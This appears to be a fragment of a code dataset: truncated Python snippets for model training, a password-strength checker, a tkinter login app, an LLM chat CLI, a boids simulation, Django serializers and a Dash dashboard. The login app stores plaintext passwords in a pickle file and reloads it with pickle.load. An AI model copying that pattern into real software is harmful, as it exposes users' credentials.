num_layers, hidden_dim).to(device)\n\ncriterion = torch.nn.CrossEntropyLoss()\noptimizer = torch.optim.Adam(model.parameters(), lr=learning_rate)\n\n\ndef train(model, train_loader, optimizer, criterion):\n    model.train()\n    total_loss = 0\n    preds = []\n    targets = []\n\n    for batch in tqdm(train_loader, desc='Training'):\n        prec_data_batch, prod_data_batch, y_true_batch = batch\n\n        y_true_batch = y_true_batch.to(device)\n\n        optimizer.zero_grad()\n\n        prec_outputs, prod_outputs = model(prec_data_batch, prod_data_batch)\n\n        prec_outputs_concat = torch.cat(prec_outputs, dim=0)\n        prod_outputs_concat = torch.cat(prod_outputs, dim=0)\n\n        combined_outputs = torch.cat(\n            [prec_outputs_concat, prod_outputs_concat], dim=1)\n\n        loss = criterion(combined_outputs, y_true_batch.long())\n        total_loss += loss.item()\n\n        loss.backward()\n        optimizer.step()\n\n        preds.extend(torch.argmax(combined_outputs, dim=1).tolist())\n        targets.extend(y_true_batch.tolist())\n\n    acc = accuracy_score(targets, preds)\n    cen = entropy(targets)\n    mcc = matthews_corrcoef(targets, preds)\n\n    return total_loss / len(train_loader), acc, cen, mcc\n\n\ndef evaluate(model, data_loader, criterion):\n    model.eval()\n    total_loss = 0\n    preds = []\n    targets = []\n\n    with torch.no_grad():\n        for batch in tqdm(data_loader, desc='Evaluating'):\n            prec_data_batch, prod_data_batch, y_true_batch = batch\n\n            y_true_batch = y_true_batch.to(device)\n\n            prec_outputs, prod_outputs = model(\n                prec_data_batch, prod_data_batch)\n\n            prec_outputs_concat = torch.cat(prec_outputs, dim=0)\n            prod_outputs_concat = torch.cat(prod_outputs, dim=0)\n\n            combined_outputs = torch.cat(\n                [prec_outputs_concat, prod_outputs_concat], dim=1)\n\n            loss = criterion(combined_outputs, y_true_batch.long())\n            total_loss += loss.item()\n\n            preds.extend(torch.argmax(combined_outputs, dim=1).tolist())\n            targets.extend(y_true_batch.tolist())\n\n    acc = accuracy_score(targets, preds)\n    cen = entropy(targets)\n    mcc = matthews_corrcoef(targets, preds)\n\n    return total_loss / len(data_loader), acc, cen, mcc\n\n\nfor epoch in range(num_epochs):\n    train_loss, train_acc, train_cen, train_mcc = train(\n        model, train_loader, optimizer, criterion)\n    val_loss, val_acc, val_cen, val_mcc = evaluate(\n        model, val_loader, criterion)\n\n    tqdm.write(f'Epoch [{\n               epoch+1}/{num_epochs}], Train Loss: {train_loss:.4f}, Val Loss: {val_loss:.4f}')\n    tqdm.write(f'Train ACC: {train_acc:.4f}, Val ACC: {val_acc:.4f}')\n    tqdm.write(f'Train CEN: {train_cen:.4f}, Val CEN: {val_cen:.4f}')\n    tqdm.write(f'Train MCC: {train_mcc:.4f}, Val MCC: {val_mcc:.4f}')\n",
    "# import needed libraries\nimport string\n\n# Funny Colorful in ASCII when program start\ntitle = \"\"\"\\033[94m\n\\033[1;31m\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m     \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m\n\\033[1;31m\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\\033[0m    \\033[1;32m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;33m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;34m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m\n\\033[1;31m\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\\033[0m    \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m  \n\\033[1;31m\u2588\u2588\u2554\u2550\u2550\u2550\u255d\\033[0m     \\033[1;32m\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\\033[0m    \\033[1;33m\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\\033[0m    \\033[1;34m\u2588\u2588\u2554\u2550\u2550\u255d\\033[0m  \n\\033[1;31m\u2588\u2588\u2551\\033[0m         \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m\n\\033[1;31m\u255a\u2550\u255d\\033[0m         \\033[1;32m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;33m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;34m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m\n\\033[1;31mPassword    \\033[1;32mSecurity    \\033[1;33mStrength    \\033[1;34mEvaluator\n\\033[0m\"\"\"\n\nprint(title)\n\ndef main():\n    # user add the password to check\n    password = input(\"\\033[1;31mEnter The Password: \\n\\033[0m\")\n    if password == \"\":\n        print(\"\\033[1;31mNo Input!! Try again\\n\\033[0m\")\n        return main()\n    \n    # get the length of passwrod that user added\n    lenght = len(password)\n    level = 0 \n    \n    # make a bool variables of rules we need to check out\n    lowercase = False\n    uppercase = False\n    digits = False\n    symbols = False\n\n    # loop in the password looking for if rules done\n    for i in password:\n        if i in string.ascii_lowercase:\n            lowercase = True\n        if i in string.ascii_uppercase:\n            uppercase = True\n        if i in string.digits:\n            digits = True\n        if i not in string.ascii_lowercase and i not in string.ascii_uppercase and i not in string.digits:\n            symbols = True\n    \n    # print new values of rules\n    print(\"\\nwhat we found in your password(\",password,\"):\")  \n    print(\"contain lowercase: \", lowercase)\n    print(\"contain uppercase: \", uppercase)\n    print(\"contain digits: \", digits)\n    print(\"contain symbols: \", symbols)\n    print(\"length of password: \", lenght)\n    \n    # here we decied what level of strong of the password\n    if lenght > 8:\n        level += 1\n\n    if lowercase == True:\n        level += 1\n\n    if uppercase == True:\n        level += 1\n\n    if digits == True:\n        level += 1\n\n    if symbols == True:\n        level += 1\n\n    # if all done but password less than 6 letters wo it will be week password\n    if lenght < 6:\n        level = 1\n\n    # output how much password strong with some colors for every level\n    if level == 1:\n        print(\"\\033[1;31mWeek Password! level is:\",level,\"\\033[0m\")\n\n    if level == 2:\n        print(\"\\033[1;34mBad Password, level is:\",level,\"\\033[0m\")\n\n    if level == 3:\n        print(\"\\033[1;33mMedium Password, level is:\",level,\"\\033[0m\")\n\n    if level == 4:\n        print(\"\\033[1;92mGood Password, level is:\",level,\"\\033[0m\")\n\n    if level == 5:\n        print(\"\\033[1;32mStrong Password, level is:\",level,\"\\033[0m\")\n        \n    # ask for test other password\n    while True:\n        q = input(\"\\nAgain? (y/n) \")\n        if q == \"y\" or q == \"\":\n            return main()\n        elif q == \"n\":\n            exit()       \n        else:\n            print(\"\\033[1;31mwronge input!\\033[0m\")\n            \n# call main function\nmain()\n",
    "from plots import *\nimport pickle\n\ndef save_data_with_pickle(data, filename):\n    try:\n        with open(filename, 'wb') as file:\n            pickle.dump(data, file)\n    except Exception as e:\n        print(\"An error occurred:\", e)\n\ndef load_data_with_pickle(filename):\n    try:\n        with open(filename, 'rb') as file:\n            data = pickle.load(file)\n        return data\n    except EOFError as e:\n        return None\n    except Exception as e:\n        print(\"An error occurred\", e)\n        exit()\n\naccounts = load_data_with_pickle(\"saved_data.pkl\")\nif accounts is None:\n    accounts = []\n\ndef starting_window():\n    starter_window = tk.Tk()\n    starter_window.title(\"Menu\")\n    starter_window.geometry(\"400x210+3650+500\")\n\n    def open_login_window():\n        starter_window.destroy()\n        log_in_window() \n\n    def open_signup_window():\n        starter_window.destroy()\n        sign_up_window()\n\n    button_font = (\"Helvetica\", 16)\n\n    go_to_login_button = tk.Button(starter_window, text=\"Sign in\", command=open_login_window, font=button_font)\n    go_to_login_button.pack(pady=15)\n\n    go_to_signup_button = tk.Button(starter_window, text=\"Sign up\", command=open_signup_window, font=button_font)\n    go_to_signup_button.pack(pady=15)\n\n    exit_button = tk.Button(starter_window, text=\"Exit\", command=lambda: exit(), font=button_font)\n    exit_button.pack(pady=15)\n\n    starter_window.mainloop()\n\ndef log_in_window():\n    global logged_in\n    logged_in = False\n    login_window = tk.Tk()\n    login_window.title(\"Sign in\")\n    login_window.geometry(\"380x200+3650+500\")\n\n    label_username = tk.Label(login_window, text=\"Username\")\n    label_username.pack()\n    entry_username = tk.Entry(login_window)\n    entry_username.pack()\n\n    label_password = tk.Label(login_window, text=\"Password\")\n    label_password.pack()\n    entry_password = tk.Entry(login_window, show=\"*\")\n    entry_password.pack()\n\n    error_shown = False\n\n    def log_in():\n        global logged_in\n        nonlocal error_shown\n\n        username = entry_username.get()\n        password = entry_password.get()\n\n        for account in accounts:\n            if account['username'] == username and account['password'] == password:\n                logged_in = True\n                login_window.destroy()\n                return\n        \n        if error_shown:\n            return\n\n        label_invalid = tk.Label(login_window, text=\"Incorrect username or password\", fg=\"red\")\n        label_invalid.pack()\n        error_shown = True \n\n    login_button = tk.Button(login_window, text=\"Sign in\", command=log_in)\n    login_button.pack()\n\n    login_window.mainloop()\n\n\ndef sign_up_window():\n    global logged_in\n    logged_in = False\n    signup_window = tk.Tk()\n    signup_window.title(\"Sign up\")\n    signup_window.geometry(\"380x200+3650+500\")\n\n    label_username = tk.Label(signup_window, text=\"Username\")\n    label_username.pack()\n    entry_username = tk.Entry(signup_window)\n    entry_username.pack()\n\n    label_password = tk.Label(signup_window, text=\"Password\")\n    label_password.pack()\n    entry_password = tk.Entry(signup_window)\n    entry_password.pack()\n\n    error_label = tk.Label(signup_window, fg=\"red\")\n    error_label.pack()\n\n    def sign_up():\n        global logged_in\n        username = entry_username.get()\n        password = entry_password.get()\n\n        found_existing = False\n\n        for account in accounts:\n            if account['username'] == username:\n                error_label.config(text=\"Username already exists. Please choose a different one\")\n                found_existing = True\n                break\n\n        if not found_existing:\n            accounts.append({'username': username, 'password': password})\n            save_data_with_pickle(accounts, \"saved_data.pkl\")\n            logged_in = True\n            signup_window.destroy()\n\n    signup_button = tk.Button(signup_window, text=\"Sign up\", command=sign_up)\n    signup_button.pack()\n\n    signup_window.mainloop()\n    \ndef analysis():\n    global logged_in\n    if logged_in == True: \n\n        main_window = tk.Tk()\n        main_window.geometry(\"1200x600+3200+370\")\n        frame1 = create_omx_frame(main_window)\n        frame2 = create_bitcoin_frame(main_window)\n        frame3 = create_gold_frame(main_window)\n        frame4 = create_USD_frame(main_window)\n        frame5 = create_silver_frame(main_window)\n\n        def show_frame_1():\n            frame1.pack(fill='both', expand=1)\n            frame2.pack_forget()\n            frame3.pack_forget()\n            frame4.pack_forget()\n            frame5.pack_forget()\n\n        def show_frame_2():\n            frame2.pack(fill='both', expand=1)\n            frame1.pack_forget()\n            frame3.pack_forget()\n            frame4.pack_forget()\n            frame5.pack_forget()\n\n        def show_frame_3():\n            frame3.pack(fill='both', expand=1)\n            frame1.pack_forget()\n            frame2.pack_forget()\n            frame4.pack_forget()\n            frame5.pack_forget()\n\n        def ",
    "\"\"\"\nUsage:\npython3 -m fastchat.serve.cli --model ~/model_weights/llama-7b\n\"\"\"\nimport argparse\nimport time\n\nimport torch\nfrom transformers import AutoTokenizer, AutoModelForCausalLM\n\nfrom llava.conversation import conv_templates, SeparatorStyle\n\n\n@torch.inference_mode()\ndef generate_stream(tokenizer, model, params, device,\n                    context_len=2048, stream_interval=2):\n    \"\"\"Adapted from fastchat/serve/model_worker.py::generate_stream\"\"\"\n\n    prompt = params[\"prompt\"]\n    l_prompt = len(prompt)\n    temperature = float(params.get(\"temperature\", 1.0))\n    max_new_tokens = int(params.get(\"max_new_tokens\", 256))\n    stop_str = params.get(\"stop\", None)\n\n    input_ids = tokenizer(prompt).input_ids\n    output_ids = list(input_ids)\n\n    max_src_len = context_len - max_new_tokens - 8\n    input_ids = input_ids[-max_src_len:]\n\n    for i in range(max_new_tokens):\n        if i == 0:\n            out = model(\n                torch.as_tensor([input_ids], device=device), use_cache=True)\n            logits = out.logits\n            past_key_values = out.past_key_values\n        else:\n            attention_mask = torch.ones(\n                1, past_key_values[0][0].shape[-2] + 1, device=device)\n            out = model(input_ids=torch.as_tensor([[token]], device=device),\n                        use_cache=True,\n                        attention_mask=attention_mask,\n                        past_key_values=past_key_values)\n            logits = out.logits\n            past_key_values = out.past_key_values\n\n        last_token_logits = logits[0][-1]\n        if temperature < 1e-4:\n            token = int(torch.argmax(last_token_logits))\n        else:\n            probs = torch.softmax(last_token_logits / temperature, dim=-1)\n            token = int(torch.multinomial(probs, num_samples=1))\n\n        output_ids.append(token)\n\n        if token == tokenizer.eos_token_id:\n            stopped = True\n        else:\n            stopped = False\n\n        if i % stream_interval == 0 or i == max_new_tokens - 1 or stopped:\n            output = tokenizer.decode(output_ids, skip_special_tokens=True)\n            pos = output.rfind(stop_str, l_prompt)\n            if pos != -1:\n                output = output[:pos]\n                stopped = True\n            yield output\n\n        if stopped:\n            break\n\n    del past_key_values\n\n\ndef main(args):\n    model_name = args.model_name\n    num_gpus = args.num_gpus\n\n    # Model\n    if args.device == \"cuda\":\n        kwargs = {\"torch_dtype\": torch.float16}\n        if num_gpus == \"auto\":\n            kwargs[\"device_map\"] = \"auto\"\n        else:\n            num_gpus = int(num_gpus)\n            if num_gpus != 1:\n                kwargs.update({\n                    \"device_map\": \"auto\",\n                    \"max_memory\": {i: \"13GiB\" for i in range(num_gpus)},\n                })\n    elif args.device == \"cpu\":\n        kwargs = {}\n    else:\n        raise ValueError(f\"Invalid device: {args.device}\")\n\n    tokenizer = AutoTokenizer.from_pretrained(model_name)\n    model = AutoModelForCausalLM.from_pretrained(model_name,\n        low_cpu_mem_usage=True, **kwargs)\n\n    if args.device == \"cuda\" and num_gpus == 1:\n        model.cuda()\n\n    # Chat\n    conv = conv_templates[args.conv_template].copy()\n    while True:\n        try:\n            inp = input(f\"{conv.roles[0]}: \")\n        except EOFError:\n            inp = \"\"\n        if not inp:\n            print(\"exit...\")\n            break\n\n        conv.append_message(conv.roles[0], inp)\n        conv.append_message(conv.roles[1], None)\n        prompt = conv.get_prompt()\n\n        params = {\n            \"model\": model_name,\n            \"prompt\": prompt,\n            \"temperature\": args.temperature,\n            \"max_new_tokens\": args.max_new_tokens,\n            \"stop\": conv.sep if conv.sep_style == SeparatorStyle.SINGLE else conv.sep2,\n        }\n\n        print(f\"{conv.roles[1]}: \", end=\"\", flush=True)\n        pre = 0\n        for outputs in generate_stream(tokenizer, model, params, args.device):\n            outputs = outputs[len(prompt) + 1:].strip()\n            outputs = outputs.split(\" \")\n            now = len(outputs)\n            if now - 1 > pre:\n                print(\" \".join(outputs[pre:now-1]), end=\" \", flush=True)\n                pre = now - 1\n        print(\" \".join(outputs[pre:]), flush=True)\n\n        conv.messages[-1][-1] = \" \".join(outputs)\n\n        if args.debug:\n            print(\"\\n\", {\"prompt\": prompt, \"outputs\": outputs}, \"\\n\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--model-name\", type=str, default=\"facebook/opt-350m\")\n    parser.add_argument(\"--num-gpus\", type=str, default=\"1\")\n    parser.add_argument(\"--device\", type=str, choices=[\"cuda\", \"cpu\"], default=\"cuda\")\n    parser.add_argument(\"--conv-template\", type=str, default=\"v1\")\n    parser.add_argument(\"--temperature\", type=float, default=0.7)\n    parser.add_argument(\"--max-new-tokens\", type=int, default=512)\n    parser.add_argument(\"--debug\", action=\"store_true\")",
    "from math import sin, cos, atan2, radians, degrees\nfrom random import randint\nimport pygame as pg\n\nFLLSCRN = False         # True for Fullscreen, or False for Window\nBOIDZ = 250              # How many boids to spawn, may slow after 200ish\nWRAP = False            # False avoids edges, True wraps boids to other side\nFISH = False            # True will turn boids into fish\nBGCOLOR = (0, 0, 0)     # Background color in RGB\nWIDTH = 1200            # default 1200\nHEIGHT = 800            # default 800\nFPS = 60                # 48-90\n\nclass Boid(pg.sprite.Sprite):\n    def __init__(self, drawSurf, isFish=False, cHSV=None):\n        super().__init__()\n        self.drawSurf = drawSurf\n        self.image = pg.Surface((15, 15))\n        self.image.set_colorkey(0)\n        randColor = pg.Color(0)  # preps color so we can use hsva\n        if cHSV is None:\n            cHSV = (randint(0, 360), 85, 85, 100)  # Default values for hue, saturation, value, alpha\n        else:\n            cHSV += (100,)  # Adding default alpha value if not provided\n        randColor.hsva = cHSV\n        if isFish:\n            pg.draw.polygon(self.image, randColor, ((7,0), (12,5), (3,14), (11,14), (2,5), (7,0)), width=3)\n            self.image = pg.transform.scale(self.image, (18, 28))\n        else:\n            pg.draw.polygon(self.image, randColor, ((7,0), (13,14), (7,11), (1,14), (7,0)))\n        self.pSpace = (self.image.get_width() + self.image.get_height()) / 2\n        self.orig_image = pg.transform.rotate(self.image.copy(), -90)\n        self.direction = pg.Vector2(1, 0)  # sets up forward direction\n        dS_w, dS_h = self.drawSurf.get_size()\n        self.rect = self.image.get_rect(center=(randint(50, dS_w - 50), randint(50, dS_h - 50)))\n        self.angle = randint(0, 360)  # random start angle, and position ^\n        self.pos = pg.Vector2(self.rect.center)\n        self.followMouse = False  # Initially not following the mouse\n\n    def update(self, allBoids, dt, ejWrap=False):  # behavior\n        selfCenter = pg.Vector2(self.rect.center)\n        curW, curH = self.drawSurf.get_size()\n        turnDir = xvt = yvt = yat = xat = 0\n        turnRate = 120 * dt\n        margin = 48\n        neiboids = sorted([  # gets list of nearby boids, sorted by distance\n            iBoid for iBoid in allBoids\n            if pg.Vector2(iBoid.rect.center).distance_to(selfCenter) < self.pSpace*12 and iBoid != self ],\n            key=lambda i: pg.Vector2(i.rect.center).distance_to(selfCenter)) # 200\n        del neiboids[7:]  # keep 7 closest, dump the rest\n        ncount = len(neiboids)\n        if ncount > 1:  # when boid has neighborS (walrus sets ncount)\n            nearestBoid = pg.Vector2(neiboids[0].rect.center)\n            for nBoid in neiboids:  # adds up neighbor vectors & angles for averaging\n                xvt += nBoid.rect.centerx\n                yvt += nBoid.rect.centery\n                yat += sin(radians(nBoid.angle))\n                xat += cos(radians(nBoid.angle))\n            tAvejAng = degrees(atan2(yat, xat)) #round()\n            targetV = (xvt / ncount, yvt / ncount)\n            # if too close, move away from closest neighbor\n            if selfCenter.distance_to(nearestBoid) < self.pSpace : targetV = nearestBoid\n            tDiff = targetV - selfCenter  # get angle differences for steering\n            tDistance, tAngle = pg.math.Vector2.as_polar(tDiff)\n            # if boid is close enough to neighbors, match their average angle\n            if tDistance < self.pSpace*6 : tAngle = tAvejAng # and ncount > 2\n            # computes the difference to reach target angle, for smooth steering\n            angleDiff = (tAngle - self.angle) + 180\n            if abs(tAngle - self.angle) > .8: turnDir = (angleDiff / 360 - (angleDiff // 360)) * 360 - 180\n            # if boid gets too close to target, steer away\n            if tDistance < self.pSpace and targetV == nearestBoid : turnDir = -turnDir\n        # Follow mouse cursor if followMouse is True\n        if self.followMouse:\n            mouse_pos = pg.mouse.get_pos()\n            angle_to_mouse = degrees(atan2(mouse_pos[1] - selfCenter[1], mouse_pos[0] - selfCenter[0]))\n            angle_diff = (angle_to_mouse - self.angle) + 180\n            if abs(angle_to_mouse - self.angle) > .8: turnDir = (angle_diff / 360 - (angle_diff // 360)) * 360 - 180\n        # Avoid edges of screen by turning toward the edge normal-angle\n        if not ejWrap and min(self.pos.x, self.pos.y, curW - self.pos.x, curH - self.pos.y) < margin:\n            if self.pos.x < margin : tAngle = 0\n            elif self.pos.x > curW - margin : tAngle = 180\n            if self.pos.y < margin : tAngle = 90\n            elif self.pos.y > curH - margin : tAngle = 270\n            angleDiff = (tAngle - self.angle) + 180\n            turnDir = (angleDiff / 360 - (angleDiff // 360)) * 360 - 180\n            edgeDist = min(self.pos.x, self.pos.y, curW - self.pos.x, curH - self.pos.y)\n            turnRate = turnRate + (1 - edgeDist / margin) * (20 - turnRate) #",
    "from django.db import transaction\nfrom rest_framework import serializers\nfrom django.core.exceptions import ValidationError\n\nfrom airport_app.models import (\n    Country,\n    City,\n    Airport,\n    Route,\n    AirplaneType,\n    Airplane,\n    Crew,\n    Flight,\n    Ticket,\n    Order,\n)\n\n\nclass CountrySerializer(serializers.ModelSerializer):\n    class Meta:\n        model = City\n        fields = (\n            \"id\",\n            \"name\",\n        )\n\n\nclass CountryRetrieveSerializer(CountrySerializer):\n    cities = CountrySerializer(many=True, read_only=True, source=\"city_country\")\n\n    class Meta:\n        model = Country\n        fields = (\"id\", \"name\", \"cities\")\n\n\nclass CitySerializer(serializers.ModelSerializer):\n    class Meta:\n        model = City\n        fields = (\n            \"id\",\n            \"name\",\n        )\n\n\nclass CityListSerializer(CitySerializer):\n    class Meta:\n        model = City\n        fields = (\n            \"id\",\n            \"name\",\n        )\n\n\nclass CityRetrieveSerializer(CitySerializer):\n    country = CountrySerializer()\n\n    class Meta:\n        model = City\n        fields = (\"id\", \"name\", \"country\")\n\n\nclass AirportSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Airport\n        fields = (\n            \"id\",\n            \"name\",\n            \"country\",\n            \"city\",\n        )\n\n    def validate(self, data):\n        country = data.get(\"country\")\n        city = data.get(\"city\")\n        if city.country != country:\n            raise serializers.ValidationError(\n                \"The selected city does not belong to the selected country.\"\n            )\n        return data\n\n\nclass AirportListSerializer(AirportSerializer):\n    country = serializers.CharField(source=\"country.name\")\n    city = serializers.CharField(source=\"city.name\")\n\n\nclass AirportRetrieveSerializer(AirportSerializer):\n    city = CityRetrieveSerializer()\n\n    class Meta:\n        model = Airport\n        fields = (\n            \"id\",\n            \"name\",\n            \"city\",\n        )\n\n\nclass RouteSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Route\n        fields = (\"id\", \"source\", \"destination\", \"distance\")\n\n\nclass RouteListSerializer(RouteSerializer):\n    source = serializers.SerializerMethodField()\n    destination = serializers.SerializerMethodField()\n\n    @staticmethod\n    def get_source(obj):\n        return f\"{obj.source.city}, {obj.source.country} - '{obj.source.name}'\"\n\n    @staticmethod\n    def get_destination(obj):\n        return (\n            f\"{obj.destination.city}, {obj.destination.country} - \"\n            f\"'{obj.destination.name}'\"\n        )\n\n\nclass RouteRetrieveSerializer(RouteSerializer):\n    source = AirportRetrieveSerializer()\n    destination = AirportRetrieveSerializer()\n\n\nclass AirplaneTypeSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = AirplaneType\n        fields = \"__all__\"\n\n\nclass AirplaneSerializer(serializers.ModelSerializer):\n    airplane_image = serializers.ImageField(read_only=True)\n\n    class Meta:\n        model = Airplane\n        fields = (\n            \"id\",\n            \"airplane_type\",\n            \"name\",\n            \"rows\",\n            \"seats_in_row\",\n            \"airplane_image\",\n        )\n\n\nclass AirplaneListSerializer(AirplaneSerializer):\n    airplane_type = serializers.SlugRelatedField(\n        many=False, read_only=True, slug_field=\"name\"\n    )\n\n    class Meta:\n        model = Airplane\n        fields = (\n            \"id\",\n            \"name\",\n            \"airplane_type\",\n            \"capacity\",\n            \"airplane_image\",\n        )\n\n\nclass AirplaneRetrieveSerializer(AirplaneSerializer):\n    airplane_type = AirplaneTypeSerializer()\n\n    class Meta:\n        model = Airplane\n        fields = (\n            \"id\",\n            \"name\",\n            \"airplane_type\",\n            \"rows\",\n            \"seats_in_row\",\n            \"capacity\",\n            \"airplane_image\",\n        )\n\n\nclass AirplaneImageSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Airplane\n        fields = (\"id\", \"airplane_image\")\n\n\nclass CrewSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Crew\n        fields = \"__all__\"\n\n\nclass FlightSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Flight\n        fields = (\n            \"id\",\n            \"route\",\n            \"airplane\",\n            \"departure_time\",\n            \"arrival_time\",\n        )\n\n\nclass FlightListSerializer(FlightSerializer):\n    route_source = serializers.CharField(source=\"route.source.name\", read_only=True)\n    route_destination = serializers.CharField(\n        source=\"route.destination.name\", read_only=True\n    )\n    airplane_name = serializers.CharField(source=\"airplane.name\", read_only=True)\n    airplane_capacity = serializers.IntegerField(\n        source=\"airplane.capacity\", read_only=True\n    )\n    tickets_available = serializers.IntegerField(read_only=True)\n    crew = serializers.SerializerMethodField()\n\n    @staticmethod\n    def get_c",
    "import dash\r\nfrom dash import dcc, html, Input, Output\r\nimport dash_bootstrap_components as dbc\r\nimport pandas as pd\r\nfrom PIL import Image\r\nimport base64\r\nfrom io import BytesIO\r\nimport os\r\nimport plotly.graph_objects as go\r\napp = dash.Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP])\r\n# Get the current working directory\r\ncwd = os.getcwd()\r\nfrom dash.dependencies import Input, Output, State\r\nfrom dash.exceptions import PreventUpdate\r\n\r\n\r\n# Build the path to the image\r\nimage_path = os.path.join(cwd, 'my_dash_app', 'images', '4840654.jpg')\r\nserver = app.server\r\n# Function to convert PIL image to Data URI\r\ndef pil_to_data_uri(img):\r\n    data = BytesIO()\r\n    img.save(data, \"JPEG\")\r\n    data_uri = \"data:image/jpeg;base64,\" + base64.b64encode(data.getvalue()).decode('utf-8')\r\n    return data_uri\r\ndef pil_to_data_uri_logo(img):\r\n    data = BytesIO()\r\n    img.save(data, \"PNG\")\r\n    data_uri = \"data:image/png;base64,\" + base64.b64encode(data.getvalue()).decode('utf-8')\r\n    return data_uri\r\n# run some code for applying logo image\r\nlogo_path = 'images/logo.png'\r\npil_logo = Image.open(logo_path)\r\nlogo_data_uri = pil_to_data_uri_logo(pil_logo)\r\n# same as ^ but for the field image\r\npil_image_path = 'images/4840654.jpg'\r\npil_image = Image.open(pil_image_path)\r\nimage_data_uri = pil_to_data_uri(pil_image)\r\n# load the play button image\r\nplay_img_path = 'images/play_pause.png'\r\nplay_img = Image.open(play_img_path)\r\nplay_img_src = pil_to_data_uri_logo(play_img)\r\n# Load the data\r\n\r\n# Initialize the Dash app\r\n# app = dash.Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP])\r\ndf = pd.read_csv('data/sb_2000_2023.csv', low_memory=False)\r\nteam_directions = df.groupby('game_id')['posteam'].unique().apply(lambda teams: {team: idx for idx, team in enumerate(teams)}).to_dict()\r\n# Define the sidebar layout for selecting game_id\r\n# Define the sidebar layout for selecting game_id\r\n\r\n\r\n# Construct the app layout\r\napp.layout = dbc.Container([\r\n    dbc.Row([\r\n        dbc.Col(\r\n            html.Div([\r\n                html.Img(src=logo_data_uri, style={'height': '100%', 'width': '100%'}),\r\n                html.Hr(),\r\n                dcc.Dropdown(\r\n                    id='game-id-dropdown',\r\n                    options=[{'label': game_id, 'value': game_id} for game_id in df['game_id'].unique()],\r\n                    value=df['game_id'].iloc[0],\r\n                    className='dropdown',\r\n                    clearable=False,\r\n                    style={'background-color': '#fffff', 'color': 'red'}\r\n                ),\r\n            ], className='sidebar'),\r\n            width=2,\r\n            style={'maxWidth': '200px'}  # Set the maximum width of the sidebar\r\n        ),\r\n        dbc.Col([\r\n            dbc.Row([\r\n                dbc.Col([\r\n                    dcc.Graph(\r\n                        id='field-graph',\r\n                        figure={},\r\n                        config={'staticPlot': True}  # Disable zoom and pan\r\n                    ),    html.Img(id='play-pause-button', src=play_img_src, className = 'btnImg', n_clicks=0, style={'cursor': 'pointer', 'height': '50px'}),\r\n\r\ndcc.Interval(\r\n    id='auto-stepper',\r\n    interval=1*1000,  # in milliseconds (e.g., 1000ms = 1 second per step)\r\n    n_intervals=0,\r\n    disabled=True,  # Initially disabled\r\n),\r\n                    dcc.Slider(\r\n                        id='time-slider',\r\n                        className='time-slider',\r\n                        value=df['...1'].min(),\r\n                        marks={str(time): str(time) for time in df['...1'].unique()},\r\n                        updatemode='drag',\r\n                       \r\n                    ),\r\n                ], width=9),\r\n                dbc.Col([\r\n                    html.Div(\r\n                        id='desc-window',\r\n                        className='desc-window',\r\n                        style={'overflow-y': 'scroll', 'height': '150px'},\r\n                    ),\r\n                    dcc.Graph(\r\n                        id='bar-graph',\r\n                        className='small-bar-graph-container'\r\n                    ),\r\n                    html.Div(\r\n                        id='score-dis',\r\n                        className='score-dis',\r\n                        style={'overflow-y': 'scroll', 'height': '200px'},\r\n                    ),\r\n                ], width=3),\r\n            ]),\r\n            dbc.Row(\r\n                dbc.Col(\r\n                    dcc.Graph(\r\n                        id='line-graph',\r\n                        className='centered-container',\r\n                        style={'margin-top': '-100px'},  # Adjust the value as needed to move the graph up\r\n                    ),\r\n                    width=12,\r\n                )\r\n            ),\r\n        ], width=10),\r\n    ]),\r\n], fluid=True)\r\n\r\n# Callback to update the football field and description window based on the selected game_id and time\r\n@app.callback(\r\n    [Output('field-graph', 'figure'), \r\n     Output('bar-graph', 'figure'), \r\n     Output('des",
